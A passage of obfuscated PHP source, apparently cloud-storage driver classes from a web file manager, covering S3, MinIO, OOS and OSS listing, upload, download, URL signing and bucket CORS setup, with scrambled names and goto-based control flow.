strlen($D©×…ñè¥±) - 1, 1) == $AÅ´Åğ««[8] ? !0 : !1; if ($d‰òÔ»áÍ) { $this->cacheMethod($AÅ´Åğ««[199], $D©×…ñè¥±, $c¥¹ìÄöêã); $this->cacheMethod($AÅ´Åğ««[200], $D©×…ñè¥±, $Aõê¤àÜÉ“); } if ($c¥¹ìÄöêã) { $b°ÒÂÊ¾µ[] = $D©×…ñè¥±; continue; } goto c¤¦Ïù¿ñ; c¤¦Ïù¿ñ: $fÖÓ¯Øå¢°[] = $A‚½é±‘£í ? $Aõê¤àÜÉ“ : $D©×…ñè¥±; goto bÖÙÙì÷¡; Fø‡¯§çñ: $D©×…ñè¥± = $Aõê¤àÜÉ“[$AÅ´Åğ««[28]]; if ($D©×…ñè¥± == $cÍïˆé±åÂ) { continue; } $d÷ë‘¶ª = isset($Aõê¤àÜÉ“[$AÅ´Åğ««[78]]) ? $Aõê¤àÜÉ“[$AÅ´Åğ««[78]] : 0; goto báÎë¿ª›ë; bÖÙÙì÷¡: } foreach ($F¶¸ì•Ö¶[$AÅ´Åğ««[201]] as $Aõê¤àÜÉ“) { $b°ÒÂÊ¾µ[] = $Aõê¤àÜÉ“[$AÅ´Åğ««[28]]; if ($d‰òÔ»áÍ) { $this->cacheMethod($AÅ´Åğ««[199], $Aõê¤àÜÉ“[$AÅ´Åğ««[28]], !0); } } if ($d‰òÔ»áÍ) { $this->cacheMethod($AÅ´Åğ««[199], $a‘…¨šÒ½‰, !0); } goto EÜ³ĞŒÈ¯; bÏ„İÂÖ…ô: $AÅ´Åğ«« =& $_SERVER[œº]; $cÍïˆé±åÂ = rtrim($a‘…¨šÒ½‰, $AÅ´Åğ««[8]) . $AÅ´Åğ««[8]; $F¶¸ì•Ö¶ = $this->listObjs($cÍïˆé±åÂ, null, null, $D©å„¿ƒéï); goto dŒÒÂÏŞïƒ; dŒÒÂÏŞïƒ: if (!$F¶¸ì•Ö¶) { return array($AÅ´Åğ««[75] => array(), $AÅ´Åğ««[74] => array()); } $d‰òÔ»áÍ = $this->listItemCache === !1 ? !1 : !0; $b°ÒÂÊ¾µ = $fÖÓ¯Øå¢° = array(); goto a²·ïÈç˜—; EÜ³ĞŒÈ¯: return array($AÅ´Åğ««[75] => $b°ÒÂÊ¾µ, $AÅ´Åğ««[74] => $fÖÓ¯Øå¢°); goto DŠå†Ï¥‹Ş; DŠå†Ï¥‹Ş: } private function listObjs($D•ƒÑ®ãæˆ, $e»Ò©»‰ŒÛ = null, $AË™Ñ­¸ = null, $DÃ¹®ŠÊÒ = null) { $D—è‚‹‘ß =& $_SERVER[œº]; $D•ƒÑ®ãæˆ = trim($D•ƒÑ®ãæˆ, $D—è‚‹‘ß[8]); $cïß”¾ÓÌÒ = empty($D•ƒÑ®ãæˆ) && $D•ƒÑ®ãæˆ !== $D—è‚‹‘ß[191] ? $D—è‚‹‘ß[33] : $D•ƒÑ®ãæˆ . $D—è‚‹‘ß[8]; return $this->client->getBucket($this->bucket, $cïß”¾ÓÌÒ, $e»Ò©»‰ŒÛ, $AË™Ñ­¸, $DÃ¹®ŠÊÒ, !0); } public function has($FÈè˜õ‡ÁÑ, $c ±Ü Ôë× = false, $fĞÈ“›Ù¼ = true) { goto cºîø›‡ã„; eÊµŠ£í¢Š: return !1; goto F‘‹µœÁÏê; c—š£•‹Â: $d“àˆŒÜˆ× = null; $aïÕ½ÈŒğ = 500; $c¢É›«ˆ½³ = $A„ŸÕÒ÷Ê×[8]; goto C×È× èÉ›; C×È× èÉ›: $EÛá„­ğí = $F—Øá›Ø = array(); while (!0) { $fÛ›ŒŠÙŒ¬ = $this->listObjs($FÈè˜õ‡ÁÑ, $d“àˆŒÜˆ×, $aïÕ½ÈŒğ, $c¢É›«ˆ½³); if (!$fÛ›ŒŠÙŒ¬) { break; } $d“àˆŒÜˆ× = $fÛ›ŒŠÙŒ¬[$A„ŸÕÒ÷Ê×[202]]; $BêÃôÌí¨á = $fÛ›ŒŠÙŒ¬[$A„ŸÕÒ÷Ê×[198]]; $bÖš½“©â = $fÛ›ŒŠÙŒ¬[$A„ŸÕÒ÷Ê×[201]]; if (empty($BêÃôÌí¨á) && empty($bÖš½“©â)) { break; } if (count($BêÃôÌí¨á) == 1 && $BêÃôÌí¨á[0][$A„ŸÕÒ÷Ê×[28]] == $e°ÆÑĞ…‘œ) { break; } if ($c ±Ü Ôë×) { if (count($BêÃôÌí¨á)) { $BêÃôÌí¨á = array_column($BêÃôÌí¨á, $A„ŸÕÒ÷Ê×[28]); $EÛá„­ğí = array_merge($EÛá„­ğí, $BêÃôÌí¨á); } if (count($bÖš½“©â)) { $bÖš½“©â = array_column($bÖš½“©â, $A„ŸÕÒ÷Ê×[28]); $F—Øá›Ø = array_merge($F—Øá›Ø, $bÖš½“©â); } if ($d“àˆŒÜˆ× === null) { break; } continue; } if ($fĞÈ“›Ù¼) { if (!empty($BêÃôÌí¨á)) { if (count($BêÃôÌí¨á) > 1 || isset($BêÃôÌí¨á[0][$A„ŸÕÒ÷Ê×[28]]) && $BêÃôÌí¨á[0][$A„ŸÕÒ÷Ê×[28]] != $e°ÆÑĞ…‘œ) { return !0; } } } else { if (!empty($bÖš½“©â)) { return !0; } } if ($d“àˆŒÜˆ× === null) { break; } } if ($c ±Ü Ôë×) { $EÛá„­ğí = array_diff($EÛá„­ğí, array($e°ÆÑĞ…‘œ)); $EÛá„­ğí = count(array_unique($EÛá„­ğí)); $F—Øá›Ø = count(array_unique($F—Øá›Ø)); return array($A„ŸÕÒ÷Ê×[203] => $EÛá„­ğí, $A„ŸÕÒ÷Ê×[204] => $F—Øá›Ø); } goto eÊµŠ£í¢Š; cºîø›‡ã„: $A„ŸÕÒ÷Ê× =& $_SERVER[œº]; $FÈè˜õ‡ÁÑ = trim($FÈè˜õ‡ÁÑ, $A„ŸÕÒ÷Ê×[8]); $e°ÆÑĞ…‘œ = empty($FÈè˜õ‡ÁÑ) && $FÈè˜õ‡ÁÑ !== $A„ŸÕÒ÷Ê×[191] ? $A„ŸÕÒ÷Ê×[33] : $FÈè˜õ‡ÁÑ . $A„ŸÕÒ÷Ê×[8]; goto c—š£•‹Â; F‘‹µœÁÏê: } public function listAll($Cø÷†©Çê¨) { $CÏ½ä®¨˜Ç =& $_SERVER[œº]; $c˜¡©¡˜½¢ = $this->fileList($Cø÷†©Çê¨, $CÏ½ä®¨˜Ç[33], !0); $Dç²Ã«½µ = array(); foreach ($c˜¡©¡˜½¢[$CÏ½ä®¨˜Ç[74]] as $B‹ŠáÉ˜’Ñ) { $Dç²Ã«½µ[$B‹ŠáÉ˜’Ñ[$CÏ½ä®¨˜Ç[28]]] = $B‹ŠáÉ˜’Ñ[$CÏ½ä®¨˜Ç[78]]; } foreach ($c˜¡©¡˜½¢[$CÏ½ä®¨˜Ç[75]] as $B‹ŠáÉ˜’Ñ) { if (is_string($B‹ŠáÉ˜’Ñ)) { $Dç²Ã«½µ[$B‹ŠáÉ˜’Ñ] = 0; } } return $this->listAllFiles($Cø÷†©Çê¨, array_keys($Dç²Ã«½µ), $Dç²Ã«½µ); } public function canRead($EĞ»„İƒÂñ) { $bò¢Ş¤¡½ù =& $_SERVER[œº]; $bÜá¶šÜØŞ = $this->client->getAccessControlPolicy($this->bucket, $EĞ»„İƒÂñ); if (!$bÜá¶šÜØŞ) { return !1; } return in_array($bÜá¶šÜØŞ, array($bò¢Ş¤¡½ù[205], $bò¢Ş¤¡½ù[206], $bò¢Ş¤¡½ù[207])) ? !0 : !1; } public function canWrite($bôàäÖ¤î) { $Eœ÷Œ’ÇİÊ =& $_SERVER[œº]; $eÏ¢äÖˆê = $this->client->getAccessControlPolicy($this->bucket, $bôàäÖ¤î); if (!$eÏ¢äÖˆê) { return !1; } return in_array($eÏ¢äÖˆê, array($Eœ÷Œ’ÇİÊ[205], $Eœ÷Œ’ÇİÊ[206])) ? !0 : !1; } public function getContent($EæÀ¤©ÒÊï) { return $this->client->getObject($this->bucket, $EæÀ¤©ÒÊï); } public function setContent($cÛˆèßºø, $F´ƒø—ƒ¿ä = '', $bïÌÍœËîÍ = false) { goto B’à ²¼®Å; a”ì¶ÒÒ‹£: $d¾øÖ­¹Æ“ = $this->client->putObject($F´ƒø—ƒ¿ä, $this->bucket, $cÛˆèßºø, $bõ®Èß‹©•[192], array(), $D³»„Ñäë); if (!$d¾øÖ­¹Æ“) { return !1; } if ($bïÌÍœËîÍ) { return !0; } goto Cìˆâå±ŠÎ; Cìˆâå±ŠÎ: $this->cacheMethod(null, null); $d¾øÖ­¹Æ“ = $this->copyFile($cÛˆèßºø, $cÛˆèßºø, array($bõ®Èß‹©•[208] => $d¾øÖ­¹Æ“[$bõ®Èß‹©•[209]])); return $d¾øÖ­¹Æ“ ? !0 : !1; goto AÄÆ¡ÙÉ; B’à ²¼®Å: $bõ®Èß‹©• =& $_SERVER[œº]; $cÛˆèßºø = $bïÌÍœËîÍ ? trim($cÛˆèßºø, $bõ®Èß‹©•[8]) . $bõ®Èß‹©•[8] : $cÛˆèßºø; $D³»„Ñäë = get_file_mime(get_path_ext($cÛˆèßºø)); goto a”ì¶ÒÒ‹£; AÄÆ¡ÙÉ: } public function fileSubstr($dÕ‰Ì„‚¤è, $dÍÕÖã£ñÇ, $f¹……Ú¶ÉĞ) { $bä„ëÔ£«ª = $dÍÕÖã£ñÇ + $f¹……Ú¶ÉĞ - 1; return $this->client->getObject($this->bucket, $dÕ‰Ì„‚¤è, array($_SERVER[œº][210] => "\142\171\x74\x65\163\x3d{$dÍÕÖã£ñÇ}\55{$bä„ëÔ£«ª}")); } public function upload($dÍ„ç‘¹è“, $FÒàÂ„‹Œ, $eÂôŞÒ¶¿ = false, $AƒÜ¤êÕŞ‹ = REPEAT_REPLACE) { $eƒ ºš»·ö =& $_SERVER[œº]; $C‹ ó…©ò× = array($eƒ ºš»·ö[208] => @md5_file($FÒàÂ„‹Œ)); $Fñ–Â‡ˆŸÌ = array($eƒ ºš»·ö[211] => get_file_mime(get_path_ext($dÍ„ç‘¹è“))); if (IO::size($FÒàÂ„‹Œ) <= 1024 * 1024 * 200) { $F­ÄˆÁª¨— = $this->client->putObjectFile($FÒàÂ„‹Œ, $this->bucket, $dÍ„ç‘¹è“, $eƒ ºš»·ö[192], $C‹ ó…©ò×, $Fñ–Â‡ˆŸÌ); return !empty($F­ÄˆÁª¨—) ? $this->getPathOuter($dÍ„ç‘¹è“) : !1; } $D¼¥ÒÌğÂ = $this->client->multiUploadObject($FÒàÂ„‹Œ, $this->bucket, trim($dÍ„ç‘¹è“, $eƒ ºš»·ö[8]), $C‹ ó…©ò×, $Fñ–Â‡ˆŸÌ); return $D¼¥ÒÌğÂ ? $this->getPathOuter($dÍ„ç‘¹è“) : !1; } public function download($F¼å„¤Œ›¤, $c‡°Äì³ë) { if (!@is_dir($this->pathFather($c‡°Äì³ë)) && !IO::mkdir($this->pathFather($c‡°Äì³ë))) { return !1; } $eÄ®Ô®„Ú× = $this->client->getObject($this->bucket, $F¼å„¤Œ›¤, array(), $c‡°Äì³ë); return $eÄ®Ô®„Ú× !== !1 ? $c‡°Äì³ë : !1; } public function link($EÔ¦®’ù², $DàÅÏË’Š‡ = array()) { $Fõ·Á‘Á¨¸ =& $_SERVER[œº]; if ($this->signVer == $Fõ·Á‘Á¨¸[212]) { return $this->client->getAuthenticatedURL($this->bucket, $EÔ¦®’ù², 3600 * 12, $DàÅÏË’Š‡); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($EÔ¦®’ù², $Fõ·Á‘Á¨¸[8]), 3600 * 12, $this->region, array(), !0, $DàÅÏË’Š‡); } public function fileOut($cÆ¤”¬“Û, $A·Å¶¹ˆé¹ = false, $b‡ƒóÌÍÒ = false, $cÉ«Ü§÷‚¬ = '') { goto aÌ«ƒ†¼‘‡; aÌ«ƒ†¼‘‡: $Då½‘ÏÏÂÊ =& $_SERVER[œº]; if ($this->isFileOutServer()) { return $this->fileOutServer($cÆ¤”¬“Û, $A·Å¶¹ˆé¹, $b‡ƒóÌÍÒ, $cÉ«Ü§÷‚¬); } if (!$b‡ƒóÌÍÒ) { $b‡ƒóÌÍÒ = $this->pathThis($cÆ¤”¬“Û); } goto dáïˆ´ó‰ì; dáïˆ´ó‰ì: $bÖ´«Ùà‰Œ = get_file_mime(get_path_ext($b‡ƒóÌÍÒ)); if ($bÖ´«Ùà‰Œ == $Då½‘ÏÏÂÊ[213]) { return parent::fileOut($cÆ¤”¬“Û, $A·Å¶¹ˆé¹, $b‡ƒóÌÍÒ, $cÉ«Ü§÷‚¬); } $A·Å¶¹ˆé¹ = $A·Å¶¹ˆé¹ ? $Då½‘ÏÏÂÊ[214] : $Då½‘ÏÏÂÊ[215]; goto dªİÃ‰ˆëù; dªİÃ‰ˆëù: $f†´Ñíëìç = array($Då½‘ÏÏÂÊ[216] => $A·Å¶¹ˆé¹ . $Då½‘ÏÏÂÊ[217] . rawurlencode($b‡ƒóÌÍÒ), $Då½‘ÏÏÂÊ[218] => $bÖ´«Ùà‰Œ); $AôèÉ¼‘…™ = $this->link($cÆ¤”¬“Û, $f†´Ñíëìç); $this->fileOutLink($AôèÉ¼‘…™); goto bä£µë–â; bä£µë–â: } public function fileOutServer($FÇ”¶Öíò, $f©ï´Î¨ĞÈ = false, $f ÄáÃêÍ = false, $Eç–¿®å—¯ = '') { parent::fileOut($FÇ”¶Öíò, $f©ï´Î¨ĞÈ, $f ÄáÃêÍ, $Eç–¿®å—¯); } public function fileOutImageServer($AîáŠ×‰Ì, $F™¦µÎøÚ = 250) { parent::fileOutImage($AîáŠ×‰Ì, $F™¦µÎøÚ); } public function hashMd5($e¤“Îí®ĞÆ, $b¯¦ì­ªƒË = '') { $c¢âÆ†°ĞÜ =& $_SERVER[œº]; $bİ‹¡–Â¾ = $this->objectMeta($e¤“Îí®ĞÆ); if (!$bİ‹¡–Â¾) { return !1; } $b¯¦ì­ªƒË = $b¯¦ì­ªƒË ? $b¯¦ì­ªƒË : _get($bİ‹¡–Â¾, $c¢âÆ†°ĞÜ[219]); $b¯¦ì­ªƒË = $b¯¦ì­ªƒË ? $b¯¦ì­ªƒË : _get($bİ‹¡–Â¾, $c¢âÆ†°ĞÜ[209], $c¢âÆ†°ĞÜ[33]); return $b¯¦ì­ªƒË; } public function uploadFormData($F­ª¾„ôÏä, $Cƒ¢œõƒøÇ = 3600) { $B”Ÿ½šñê =& $_SERVER[œº]; $CÏçîºò¬í = $this->pathFather($F­ª¾„ôÏä); $eåÉç®å‰ = $this->client->getHttpUploadPostParams($this->bucket, $CÏçîºò¬í, $B”Ÿ½šñê[192], $Cƒ¢œõƒøÇ); return array_merge((array) $eåÉç®å‰, array($B”Ÿ½šñê[175] => $this->getHost())); } public function multiUploadFormData($cˆ–ğ”‡Ü, $b¥÷‘©‡È = 3600) { $fÔªÎåç’… =& $_SERVER[œº]; $AµÑÉÚ¨íï = gmdate($fÔªÎåç’…[220]); $aùÅ‰·¿‚‡ = array(); $añ°Ô˜ôÓ™ = $this->client->getUploadId($this->bucket, $cˆ–ğ”‡Ü, $aùÅ‰·¿‚‡); if (!$añ°Ô˜ôÓ™) { return !1; } return array($fÔªÎåç’…[221] => $añ°Ô˜ôÓ™, $fÔªÎåç’…[175] => $this->getHost() . $fÔªÎåç’…[8] . $this->pathEncode($cˆ–ğ”‡Ü), $fÔªÎåç’…[222] => $AµÑÉÚ¨íï, $fÔªÎåç’…[93] => $cˆ–ğ”‡Ü); } public function multiUploadAuthData($b£çáÓÇÒ, $dÀàÉƒÎµ° = array()) { goto Bš‚éæÇ§²; Bš‚éæÇ§²: $C° ¨Œ¯Ëê =& $_SERVER[œº]; $cî ÓÍ±Ñ¥ = isset($dÀàÉƒÎµ°[$C° ¨Œ¯Ëê[222]]) ? $dÀàÉƒÎµ°[$C° ¨Œ¯Ëê[222]] : gmdate($C° ¨Œ¯Ëê[220]); $B»óâ‹œ” = isset($dÀàÉƒÎµ°[$C° ¨Œ¯Ëê[168]]) ? $dÀàÉƒÎµ°[$C° ¨Œ¯Ëê[168]] : $C° ¨Œ¯Ëê[33]; goto cçİ®Êá…; cçİ®Êá…: $CÉŠ˜–ë‹ù = $dÀàÉƒÎµ°[$C° ¨Œ¯Ëê[93]]; unset($dÀàÉƒÎµ°[$C° ¨Œ¯Ëê[93]]); if (isset($dÀàÉƒÎµ°[$C° ¨Œ¯Ëê[223]])) { $dÀàÉƒÎµ°[$C° ¨Œ¯Ëê[222]] = $cî ÓÍ±Ñ¥; return $this->listUploadParts($CÉŠ˜–ë‹ù, $dÀàÉƒÎµ°); } goto F¯Ç‚ÆöŠ±; Dòô‹ˆ§Á¨: $EğÂŠ†ƒç = implode($C° ¨Œ¯Ëê[229], $a˜ÆÎ›ÑÙ·); $fÉÓªƒ¡Ö = base64_encode(hash_hmac($C° ¨Œ¯Ëê[230], $EğÂŠ†ƒç, $this->secret, !0)); $cÎŞĞ´‰Úî = $C° ¨Œ¯Ëê[231] . $this->accessKey . $C° ¨Œ¯Ëê[4] . $fÉÓªƒ¡Ö; goto cò«ÂŒéƒØ; cò«ÂŒéƒØ: if (strpos($B»óâ‹œ”, $C° ¨Œ¯Ëê[225]) === 0) { return array($C° ¨Œ¯Ëê[232] => $cÎŞĞ´‰Úî, $C° ¨Œ¯Ëê[222] => $cî ÓÍ±Ñ¥); } return $cÎŞĞ´‰Úî; goto E–Á¾…™—ì; F¯Ç‚ÆöŠ±: $a˜ÆÎ›ÑÙ· = array($C° ¨Œ¯Ëê[224], $C° ¨Œ¯Ëê[33], $C° ¨Œ¯Ëê[119], $C° ¨Œ¯Ëê[33], "\x78\55\141\x6d\172\55\x64\141\164\x65\72{$cî ÓÍ±Ñ¥}", $C° ¨Œ¯Ëê[8] . $this->bucket . $C° ¨Œ¯Ëê[8] . $this->pathEncode($CÉŠ˜–ë‹ù) . $B»óâ‹œ”); if (strpos($B»óâ‹œ”, $C° ¨Œ¯Ëê[225]) === 0) { $a˜ÆÎ›ÑÙ·[0] = $C° ¨Œ¯Ëê[226]; } if (isset($dÀàÉƒÎµ°[$C° ¨Œ¯Ëê[227]]) && $dÀàÉƒÎµ°[$C° ¨Œ¯Ëê[227]] == $C° ¨Œ¯Ëê[228]) { $a˜ÆÎ›ÑÙ·[0] = $C° ¨Œ¯Ëê[228]; } goto Dòô‹ˆ§Á¨; E–Á¾…™—ì: } public function listUploadParts($aˆ¡¬‡õ¬, $a‡á‡Æ±™Å = array()) { goto dš·¸ˆø; dš·¸ˆø: $a¥è«ØòÑ“ =& $_SERVER[œº]; $AõñˆÍ‰‚ = str_replace($a¥è«ØòÑ“[233], $a¥è«ØòÑ“[33], $a‡á‡Æ±™Å[$a¥è«ØòÑ“[168]]); $A‘÷ò¨§Ü¡ = $this->client->listParts($this->bucket, $aˆ¡¬‡õ¬, $AõñˆÍ‰‚); goto D…î÷£–ö; D…î÷£–ö: if (!$A‘÷ò¨§Ü¡) { return !1; } unset($a‡á‡Æ±™Å[$a¥è«ØòÑ“[223]], $a‡á‡Æ±™Å[$a¥è«ØòÑ“[227]]); $a‡á‡Æ±™Å[$a¥è«ØòÑ“[93]] = $aˆ¡¬‡õ¬; goto Aí„•¾ÀÀ™; Aí„•¾ÀÀ™: $e²¿™øÖä¯ = $this->multiUploadAuthData($aˆ¡¬‡õ¬, $a‡á‡Æ±™Å); if (empty($e²¿™øÖä¯)) { return !1; } return array($a¥è«ØòÑ“[232] => $e²¿™øÖä¯, $a¥è«ØòÑ“[222] => $a‡á‡Æ±™Å[$a¥è«ØòÑ“[222]], $a¥è«ØòÑ“[234] => $A‘÷ò¨§Ü¡); goto dó÷¤ç¬ÚÓ; dó÷¤ç¬ÚÓ: } public function getHost() { return parent::getHost() . $_SERVER[œº][8] . $this->bucket; } public function size($cİÚŒ®¬õø) { $b™¥ìÈŠ´ˆ = $this->objectMeta($cİÚŒ®¬õø); return $b™¥ìÈŠ´ˆ ? $b™¥ìÈŠ´ˆ[$_SERVER[œº][78]] : 0; } public function info($bŒ©ôªÆ¢) { if ($this->isFolder($bŒ©ôªÆ¢)) { return $this->folderInfo($bŒ©ôªÆ¢); } else { if ($this->isFile($bŒ©ôªÆ¢)) { return $this->fileInfo($bŒ©ôªÆ¢); } } return !1; } public function exist($Eçï¾°Ô‹©) { return $this->isFile($Eçï¾°Ô‹©) || $this->isFolder($Eçï¾°Ô‹©); } public function isFile($FÕ„ÕöÙµ›) { return !$this->isFolder($FÕ„ÕöÙµ›) && $this->objectMeta($FÕ„ÕöÙµ›); } public function isFolder($f¢¤²ò ¦) { return $this->cacheMethod($_SERVER[œº][199], $f¢¤²ò ¦); } protected function objectMeta($e ¹ ‘ ­…) { return $this->cacheMethod($_SERVER[œº][200], $e ¹ ‘ ­…); } protected function _objectMeta($EŠŒİ§»§†) { $DŸß¸ä·Œ =& $_SERVER[œº]; $EŠŒİ§»§† = rtrim($EŠŒİ§»§†, $DŸß¸ä·Œ[8]); try { $B¸°æ¹˜×ù = $this->client->getObjectInfo($this->bucket, $EŠŒİ§»§†); if (!isset($B¸°æ¹˜×ù[$DŸß¸ä·Œ[219]]) && isset($B¸°æ¹˜×ù[$DŸß¸ä·Œ[235]])) { $B¸°æ¹˜×ù[$DŸß¸ä·Œ[219]] = $B¸°æ¹˜×ù[$DŸß¸ä·Œ[235]]; } } catch (Exception $b…„¤ôòğ×) { $B¸°æ¹˜×ù = !1; } if (!$B¸°æ¹˜×ù) { } return $B¸°æ¹˜×ù; } protected function _isFolder($EáÍë„È—†) { goto eÌÒË„£º·; FòˆÅÁª‚‰: return stripos($eÆŸğôÛ§œ, $EáÍë„È—† . $AÛ«ÊÒˆ›[8]) === 0 ? !0 : !1; if (substr($eÆŸğôÛ§œ, -1) == $AÛ«ÊÒˆ›[8]) { return !0; } if (get_path_this($eÆŸğôÛ§œ) == get_path_this($EáÍë„È—†)) { return !1; } goto cÉĞ‰ Ş; cÉĞ‰ Ş: return !0; goto cÆ’øµóô; E‡ßÓŸÈ‡ê: $cêŠòù‘²‡ = $this->client->getBucket($this->bucket, $EáÍë„È—†, null, 1); if (empty($cêŠòù‘²‡[$AÛ«ÊÒˆ›[198]])) { return !1; } $eÆŸğôÛ§œ = $cêŠòù‘²‡[$AÛ«ÊÒˆ›[198]][0][$AÛ«ÊÒˆ›[28]]; goto FòˆÅÁª‚‰; eÌÒË„£º·: $AÛ«ÊÒˆ› =& $_SERVER[œº]; $EáÍë„È—† = rtrim($EáÍë„È—†, $AÛ«ÊÒˆ›[8]); if ($EáÍë„È—† == $AÛ«ÊÒˆ›[33] || $EáÍë„È—† == $AÛ«ÊÒˆ›[8]) { return !0; } goto E‡ßÓŸÈ‡ê; cÆ’øµóô: } } define($_SERVER[œº][236], 1); goto C¢æø›©Ëß; E³ø¤¼ò: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($DÄ¿²ó¿öô) { parent::__construct($DÄ¿²ó¿öô); $this->signatureVersion($_SERVER[œº][212]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($AóÎóŞ’á) { parent::__construct($AóÎóŞ’á); $this->signatureVersion($_SERVER[œº][212]); } public function fileOutLink($B°ÉŠŒµˆš) { $FŠñ‰Ö¥È =& $_SERVER[œº]; if (substr($B°ÉŠŒµˆš, 0, 7) == $FŠñ‰Ö¥È[1204]) { $B°ÉŠŒµˆš = $FŠñ‰Ö¥È[1205] . substr($B°ÉŠŒµˆš, 7); } header($FŠñ‰Ö¥È[159] . $B°ÉŠŒµˆš); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($aŒñòé‚à) { parent::__construct(); include_once SDK_DIR . $_SERVER[œº][1260]; $this->_init($aŒñòé‚à); } public function _init($BËÓ½©âŠß) { $Bé…íğ„¼Ò =& $_SERVER[œº]; foreach ($BËÓ½©âŠß as $a‘âõÊ¤í÷ => $E¬æÒÔÇ‡¢) { if (isset($this->{$a‘âõÊ¤í÷})) { $this->{$a‘âõÊ¤í÷} = $E¬æÒÔÇ‡¢; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Bé…íğ„¼Ò[1261] . LNG($Bé…íğ„¼Ò[1262])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto f²Ò¥¿Šß; f²Ò¥¿Šß: $CÏä‘ÛŒ =& $_SERVER[œº]; $Bœä·šõè = new OSS\Model\CorsConfig(); $BøìœÕ­ªÖ = new OSS\Model\CorsRule(); goto aôÒ¨ôœÔÒ; aôÒ¨ôœÔÒ: $BøìœÕ­ªÖ->addAllowedOrigin($CÏä‘ÛŒ[1263]); $BøìœÕ­ªÖ->addAllowedMethod($CÏä‘ÛŒ[1264]); $BøìœÕ­ªÖ->addAllowedMethod($CÏä‘ÛŒ[1265]); goto bÒ“İœãß; fÜ¬¡†Êù: $BøìœÕ­ªÖ->setMaxAgeSeconds(600); $BøìœÕ­ªÖ->addExposeHeader($CÏä‘ÛŒ[1268]); $BøìœÕ­ªÖ->addAllowedHeader($CÏä‘ÛŒ[1263]); goto b™…»öï‘; bÒ“İœãß: $BøìœÕ­ªÖ->addAllowedMethod($CÏä‘ÛŒ[1266]); $BøìœÕ­ªÖ->addAllowedMethod($CÏä‘ÛŒ[1267]); $BøìœÕ­ªÖ->addAllowedMethod($CÏä‘ÛŒ[158]); goto fÜ¬¡†Êù; b™…»öï‘: $Bœä·šõè->addRule($BøìœÕ­ªÖ); try { $this->client->putBucketCors($this->bucket, $Bœä·šõè); } catch (OSS\Core\OssException $e‘±Õõ™ôë) { return !1; } return !0; goto EÚÚÃ¥† Ç; EÚÚÃ¥† Ç: } public function getBucketCors() { goto d”ƒ¬œšÁÛ; d”ƒ¬œšÁÛ: $cÅá«ì¸Ù =& $_SERVER[œº]; $cƒ×½Œİ¾ = null; try { $cƒ×½Œİ¾ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $dõˆ§ïéî) { return null; } goto fˆÔŠ­ø­“; fˆÔŠ­ø­“: if (!$cƒ×½Œİ¾ || !($cÃæê¥½Œ = $cƒ×½Œİ¾->getRules())) { return null; } $C®Õ›½¶²ª = $cÃæê¥½Œ[0]->getAllowedOrigins(); $B¾Î¨Ÿ¡¾ù = $cÃæê¥½Œ[0]->getAllowedMethods(); goto bæ‹‰áÎŞ; d×æÈ½…Í: return array($cÅá«ì¸Ù[181] => isset($C®Õ›½¶²ª[0]) ? $C®Õ›½¶²ª[0] : $cÅá«ì¸Ù[33], $cÅá«ì¸Ù[185] => $B¾Î¨Ÿ¡¾ù, $cÅá«ì¸Ù[1269] => $aË¬½ãë½, $cÅá«ì¸Ù[1270] => isset($cŒÙ¦­İÏ[0]) ? $cŒÙ¦­İÏ[0] : $cÅá«ì¸Ù[33], $cÅá«ì¸Ù[183] => isset($E©‡ÆÈ„¥›[0]) ? $E©‡ÆÈ„¥›[0] : $cÅá«ì¸Ù[33]); goto Fœ‰›Â±ßê; bæ‹‰áÎŞ: $aË¬½ãë½ = $cÃæê¥½Œ[0]->getMaxAgeSeconds(); $cŒÙ¦­İÏ = $cÃæê¥½Œ[0]->getExposeHeaders(); $E©‡ÆÈ„¥› = $cÃæê¥½Œ[0]->getAllowedHeaders(); goto d×æÈ½…Í; Fœ‰›Â±ßê: } public function isBucketCors() { goto A™ê…É“êÌ; A™ê…É“êÌ: $c‚¶ï÷¥Ê­ =& $_SERVER[œº]; $dÇ¥ÕáÄÕ  = $this->getBucketCors(); if (!$dÇ¥ÕáÄÕ  || !is_array($dÇ¥ÕáÄÕ )) { return !1; } goto aÂÜ¶ô‡³Õ; Eå¸â¾ÆºÃ: $EšÓ·ù´Ç = array($c‚¶ï÷¥Ê­[186], $c‚¶ï÷¥Ê­[187], $c‚¶ï÷¥Ê­[188], $c‚¶ï÷¥Ê­[189], $c‚¶ï÷¥Ê­[190]); $Eï°ÄÙ¢Í = array_diff($EšÓ·ù´Ç, $aê… éÄËì); return empty($Eï°ÄÙ¢Í); goto D†ùÚ½“†; aÂÜ¶ô‡³Õ: if ($dÇ¥ÕáÄÕ [$c‚¶ï÷¥Ê­[181]] != $c‚¶ï÷¥Ê­[182] || $dÇ¥ÕáÄÕ [$c‚¶ï÷¥Ê­[183]] != $c‚¶ï÷¥Ê­[182]) { return !1; } $aê… éÄËì = array_map($c‚¶ï÷¥Ê­[184], $dÇ¥ÕáÄÕ [$c‚¶ï÷¥Ê­[185]]); if (!is_array($aê… éÄËì)) { $aê… éÄËì = array(); } goto Eå¸â¾ÆºÃ; D†ùÚ½“†: } public function mkfile($F÷ˆÕÜÊŒ, $e®¼½»ÇĞŸ = '', $A¯Çº°—ˆÙ = REPEAT_RENAME) { $DµÊÕ¹¯‘ = $this->setContent($F÷ˆÕÜÊŒ, $e®¼½»ÇĞŸ); if ($DµÊÕ¹¯‘ !== !1) { return $this->getPathOuter($F÷ˆÕÜÊŒ); } return !1; } public function mkdir($Dƒ˜Œ“ğÂ§, $dàŞÎˆÃ = REPEAT_SKIP) { if ($this->_isFolder($Dƒ˜Œ“ğÂ§)) { return $this->getPathOuter($Dƒ˜Œ“ğÂ§); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($Dƒ˜Œ“ğÂ§)); } catch (OSS\Core\OssException $aŒİ›Ø¹ÍÒ) { return !1; } return $this->getPathOuter($Dƒ˜Œ“ğÂ§); } private function 